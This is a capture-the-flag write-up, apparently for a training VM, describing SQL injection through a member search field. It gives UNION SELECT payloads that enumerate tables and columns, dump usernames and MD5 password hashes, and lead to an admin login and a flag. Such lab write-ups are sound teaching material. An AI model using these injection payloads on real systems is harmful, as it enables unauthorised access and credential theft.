# SQL Injection - Login

See [SQL injection Images](https://github.com/anyashuka/Darkly/tree/master/SQL_Injection_Images) for SQL Injection description, use & prevention.

## Breach

Go to page:

{VM_IP}/index.php?page=member

When we were doing SQL injection into the image search, we noticed something after inputting the following command:


### Get the table names in the database

```1 OR 1=1 UNION SELECT table_schema, table_name FROM information_schema.TABLES```

* First name: Member_Brute_Force,
Surname : db_default

... Maybe this means we can exploit a member's login details (name, password).

We're going to be doing the same thing here as we did in the SQL image search injection. 
Insert the following commands into the member search bar:


### Find table columns in the database for each table

```1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.COLUMNS```

Here we find:

* First name: db_default,
Surname : id
* First name: db_default,
Surname : username
* First name: db_default,
Surname : password


### Search for the username and password of Member_Brute_Force

```1 OR 1=1 UNION SELECT username, password FROM Member_Brute_Force.db_default```

* First name: Flag,
Surname : GetThe
* First name: root,
Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
* First name: admin,
Surname : 3bf1114a986ba87ed28fc1b5884fc2f8

... Aha! Let's try decrypting those with md5.

[md5_decrypt](https://md5decrypt.net)(3bf1114a986ba87ed28fc1b5884fc2f8) = shadow


### Use our newly aquired admin + password details

Let's try plugging that in on the login page:

{VM_IP}/index.php?page=signin

Username: admin, Password: shadow

The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
